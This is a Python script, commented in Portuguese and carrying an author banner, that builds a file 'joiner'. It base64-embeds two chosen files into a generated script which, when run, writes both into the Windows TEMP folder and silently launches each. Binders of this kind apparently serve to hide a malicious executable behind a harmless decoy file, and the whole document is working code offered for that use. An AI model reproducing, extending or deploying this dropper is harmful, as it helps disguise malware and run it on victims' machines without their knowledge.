import sys
import os
import base64

# Definindo cores para saída no terminal
BLUE = '\33[94m'
RED = '\033[91m'
YELLOW = '\33[93m'
END = '\033[0m'

# Verifica se há argumentos suficientes
if len(sys.argv) < 2:
    print(RED + """  

 ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓██████████████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                                    
                                                                                                    
                                                                                                                                                                                                                                             
    """ + END + BLUE + 'GitHub: https://github.com/n3ur0m4ncr'.format(RED, END).center(69) +
          '\n' + '\tAutor: {}n3ur0m4ncr'.format(YELLOW, RED, YELLOW, BLUE).center(76) +
          '\n' + '\tVersion: {}2.0{}'.format(YELLOW, END).center(80) + '\n')

# Recebe o nome dos arquivos de entrada
arquivo1 = input('Primeiro arquivo: ')
arquivo2 = input('Segundo arquivo: ')

# Extrai o nome dos arquivos
nomeArquivo1 = os.path.basename(arquivo1)
nomeArquivo2 = os.path.basename(arquivo2)

# Abre os arquivos de entrada e o arquivo de saída
with open(arquivo1, 'rb') as arquivo1Aberto, \
        open(arquivo2, 'rb') as arquivo2Aberto, \
        open('arquivoFinal.py', 'w') as arquivo_gerado:

    # Escreve o conteúdo do novo arquivo Python
    arquivo_gerado.write('''import os, base64
def join(conteudoBinario, nomeArquivo):
    if not os.path.exists(os.environ["TEMP"] + "\\\\" + nomeArquivo):
        with open(os.environ["TEMP"] + "\\\\" + nomeArquivo, "wb") as arquivoTemporario:
            arquivoTemporario.write(conteudoBinario)
    os.startfile(os.environ["TEMP"] + "\\\\" + nomeArquivo)
arquivo1base64 = "{}"
join(base64.b64decode(arquivo1base64), "{}")
arquivo2base64 = "{}"
join(base64.b64decode(arquivo2base64), "{}")
'''.format(base64.b64encode(arquivo1Aberto.read()).decode('utf-8'), nomeArquivo1,
           base64.b64encode(arquivo2Aberto.read()).decode('utf-8'), nomeArquivo2))
